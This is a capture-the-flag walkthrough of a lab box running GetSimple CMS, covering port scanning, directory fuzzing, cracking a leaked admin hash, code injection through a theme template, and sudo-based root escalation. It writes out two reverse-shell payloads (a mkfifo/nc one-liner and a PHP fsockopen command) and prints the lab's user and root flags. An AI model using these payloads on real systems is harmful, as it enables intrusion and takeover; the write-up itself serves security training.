# Getting Started: Knowledge Check

### Port Enumeration

We can first find out all the opening port first

```bash
└─$ rustscan -a xx.xxx.xx.xxx --range 1-65535 --ulimit 5000
.
.
.
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We can see only ssh and http are open, we can then confirm the service version

```bash
└─$ nmap -sC -sV xx.xxx.xx.xxx -p22,80
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 08:04 -0500
Nmap scan report for xx.xxx.xx.xxx
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
```

## HTTP (Port 80)

Because we don’t have the SSH credentials, I will go to the http web page first.

![image.png](images/image.png)

We can confirm that there is an `/admin/` endpoint again by reading the `robots.txt` file

```bash
User-agent: *
Disallow: /admin/
```

## Admin Login Page

Here is the admin page(we will be redirected to here if we are not log in)

![image.png](images/image%201.png)

I spend some time trying to reset the password, as I was mislead by the hidden input, the nonce might be hashed so that I can log in as admin:(

```bash
<form class="login" action="resetpassword.php" method="post" >
			<input name="nonce" id="nonce" type="hidden" value="690e786ef24a11fe4626c4bdda0f8115da0fedf9"/>
			<p><b>Username:</b><br /><input class="text" name="username" type="text" value="" /></p>
			<p><input class="submit" type="submit" name="submitted" value="Send New Password" /></p>
		</form>
```

## Enumeration

Because we are stucked, we can try to enumerate to see if there is something interesting

```bash
└─$ ffuf -u http://xx.xxx.xx.xxx/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xx.xxx/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2623, Words: 150, Lines: 61, Duration: 225ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4906ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4906ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4910ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 224ms]
index.php               [Status: 200, Size: 2623, Words: 150, Lines: 61, Duration: 225ms]
lang                    [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 225ms]
template                [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 224ms]
:: Progress: [4614/4614] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:29] :: Errors: 0 ::

```

The endpoint `inc` might be useful; however, because most of them are currently PHP files, we can learn only a little by reading them.

![image.png](images/image%202.png)

How about trying to enumerate outside? 

```bash
ffuf -u http://xx.xxx.xx.xxx/FUZZ -w /usr/share/wordlists/dirb/common.txt                                                                                                                                                    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xx.xxx/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 5485, Words: 422, Lines: 152, Duration: 224ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2461ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2461ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 217ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4487ms]
backups                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 218ms]
data                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 218ms]
index.php               [Status: 200, Size: 5485, Words: 422, Lines: 152, Duration: 220ms]
plugins                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 218ms]
robots.txt              [Status: 200, Size: 32, Words: 3, Lines: 2, Duration: 221ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 218ms]
sitemap.xml             [Status: 200, Size: 431, Words: 7, Lines: 3, Duration: 220ms]
theme                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 217ms]
:: Progress: [4614/4614] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

We do see some promising results, such as `backups` and `data`

![image.png](images/image%203.png)

Once we click the URL, a file will be download, using strings will gives us a password?

```bash
└─$ strings admin.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<item><USR>admin</USR><NAME/><PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD><EMAIL>admin@gettingstarted.com</EMAIL><HTMLEDITOR>1</HTMLEDITOR><TIMEZONE/><LANG>en_US</LANG></item>

```

It turns out to be a password hash. To solve this, we can use [Hashes.com](https://hashes.com/en/decrypt/hash)

![image.png](images/image%204.png)

<aside>
💡

We can also find the credentials under **`/data/users/admin.xml`**

![image.png](images/image%205.png)

</aside>

So we get the credentials `admin:admin`, we should be able to log in, and we did it!

![image.png](images/image%206.png)

## Post-Exploitation in Admin Panel

But what is the next step

I first tried to upload a file, however I can’t even upload one:(, the button is just a decoration.

![image.png](images/image%207.png)

How about theme? I saw we can edit the theme, hopefully we can inject some code to achieve RCE

![image.png](images/image%208.png)

Inside the template, we can see some php code, what if I change one of it and see if it will output the id?

![image.png](images/image%209.png)

After saving the changing, we can open a new tab back to the main page, and we can see the results

![image.png](images/image%2010.png)

## Reverse Shell and User Flag

We can then enter the reverse shell payload `<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 9001 >/tmp/f'); ?>`. And get the user flag

```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [xx.xxx.xx.xxx] 52230
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
mrb3n
$ cd mrb3n
$ ls
user.txt
$ cat user.txt
7002d65b149b0a4d19132a66feed21d8

```

User flag: `7002d65b149b0a4d19132a66feed21d8`

## Root Flag

For root flag, it is much simple in my point of view, if we use `sudo -l`, we cna find that we can able to run php in sudo mode

```bash
$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

We can then use `sudo /usr/bin/php -r '$sock=fsockopen("xx.xx.xx.xx",9002);exec("sh <&3 >&3 2>&3");'`. Use [revshells.com](https://www.revshells.com/) to generate a payload

```bash
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [xx.xxx.xx.xxx] 45590
whoami
root
ls /root
root.txt
snap
cat /root/root.txt
f1fba6e9f71efb2630e6e34da6387842
```

Root Flag: `f1fba6e9f71efb2630e6e34da6387842`
